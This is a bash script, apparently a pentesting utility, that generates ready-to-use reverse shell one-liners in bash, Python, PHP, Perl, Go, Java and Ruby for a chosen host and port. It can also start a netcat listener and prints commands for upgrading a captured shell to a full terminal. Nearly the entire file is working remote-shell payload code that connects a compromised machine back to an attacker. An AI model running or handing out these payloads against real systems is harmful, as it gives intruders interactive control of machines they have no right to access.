#!/usr/bin/env bash
#Simple Reverse Shell 0.9 : Reverse shell code generator
#Author : Martin Kubecka

#Colors
clear='\033[0m'
flashing_red_bg_yellow='\e[2;31;43m'
flashing_red='\e[5;33;40m'
green='\033[0;32m'
bg_green='\033[0;42m'
bold_red='\e[1;31;40m'
red_bg_gray='\e[1;31;47m'
bold_yellow='\e[1;33;40m'

echo -e "${flashing_red_bg_yellow} --- Simple Reverse Shell Generator --- ${clear}"
#echo -e "${flashing_red}python :: php :: java :: bash :: ruby :: perl :: netcat${clear}"

usage() {
cat << EOF

Usage: $0 [-h|l|u] -i <LHOST> -p <LPORT> -t <PAYLOAD>

Simple Reverse Shell Generator

Available options:

  -h	Print this help and exit
  -i	The target address
  -p	The target port
  -t	The payload type : bash, python, java, php, perl, ruby, go
  -l	Start a netcat listener
  -u	List commands for a shell upgrade

Examples:

  $0 -i 10.0.0.1 -p 4242 -t python
  $0 -i 10.0.0.1 -p 4242 -t bash -l -u

EOF
}
 
bash() {
	printf "\n${green}[+]${clear} ${bg_green}BASH${clear}\n\n"
	printf "${bold_yellow}bash -i >& /dev/tcp/$lhost/$lport 0>&1${clear}\n\n"
	printf "${bold_yellow}0<&196;exec 196<>/dev/tcp/$lhost/$lport; sh <&196 >&196 2>&196${clear}\n\n"
}    

python() {
	printf "\n${green}[+]${clear} ${bg_green}PYTHON${clear}\n\n"
	printf "${bold_yellow}python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$lhost\",$lport));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"/bin/bash\")\'${clear}\n\n"
}

php() {
	printf "\n${green}[+]${clear} ${bg_green}PHP${clear}\n\n"
	printf "${bold_yellow}php -r \'\$sock=fsockopen(\"$lhost\",$lport);exec(\"/bin/sh -i <&3 >&3 2>&3\");\'${clear}\n\n"
}

perl() {
	printf "\n${green}[+]${clear} ${bg_green}PERL${clear}\n\n"
	printf "${bold_yellow}perl -e \'use Socket;\$i=\"$lhost\";\$p=$lport;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};\'${clear}\n\n"
	printf ""
}

go() {
	printf "\n${green}[+]${clear} ${bg_green}GO${clear}\n\n"
	printf "${bold_yellow}echo \'package main;import\"os/exec\";import\"net\";func main(){c,_:=net.Dial(\"tcp\",\"$lhost:$lport\");cmd:=exec.Command(\"/bin/sh\");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}\' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go${clear}\n\n"
}

java() {
	printf "\n${green}[+]${clear} ${bg_green}JAVA${clear}\n\n"
	printf "${bold_yellow}Runtime r = Runtime.getRuntime();${clear}\n"
	printf "${bold_yellow}Process p = r.exec(\"/bin/bash -c \'exec 5<>/dev/tcp/$lhost/$lport;cat <&5 | while read line; do \$line 2>&5 >&5; done\'\");${clear}\n"
	printf "${bold_yellow}p.waitFor();${clear}\n\n"
}

ruby() {
	printf "\n${green}[+]${clear} ${bg_green}RUBY${clear}\n\n"
	printf "${bold_yellow}ruby -rsocket -e\'f=TCPSocket.open(\"$lhost\",$lport).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)\'${clear}\n\n"
}

listener() {
	
	printf "\n---------------------------------------------\n"
	# Local listener option
	# Take user input to set the listening port
	read -p "Enter a port number for a listener : " listener_port
	    
	# Ensure port for listener exists
	if [ $listener_port -gt 65535 ]
	then
	    
	echo "There are only 65 535 ports to listen on!"
	    
	exit
	    
	else

    	activate_listener=true
	fi
}

upgrade() {

	printf "\n---------------------------------------------\n"
	# Shell upgrade helper
	printf "${red_bg_gray}[INFO] SHELL UPGRADE${clear}"
	printf "\n\n"
	printf "python -c \'import pty; pty.spawn(\"/bin/bash\")\'\n";
	printf "background the shell with Ctrl + Z\n";
	printf "export SHELL=bash\n";
	printf "stty raw -echo; fg\n";
	printf "export TERM=xterm-256color\n";
	printf "stty rows 38 columns 116\n";
}

# Script logic
activate_listener=false

while getopts "i:p:t:hlu" arg; do

	case "$arg" in

	 i) lhost=${OPTARG} ;;
	 p) lport=${OPTARG} ;;
	 t) type=${OPTARG} ;;
	 h) usage ;;
	 l) listener ;;
	 u) upgrade ;;

	esac

done 

case $type in

  bash | sh)
    bash
    ;;

  python | py)
    python
    ;;
    
  php)
    php
    ;;
    
  perl)
    perl
    ;;    

  go)
    go
    ;;

  java)
    java
    ;;

  ruby)
    ruby
    ;;
     
  *)
    printf "\n\n${bold_red}[!] Invalid payload type option.${clear}\n\n"
    ;;
    
esac

if $activate_listener ; then

	nc -lnvp $listener_port

fi
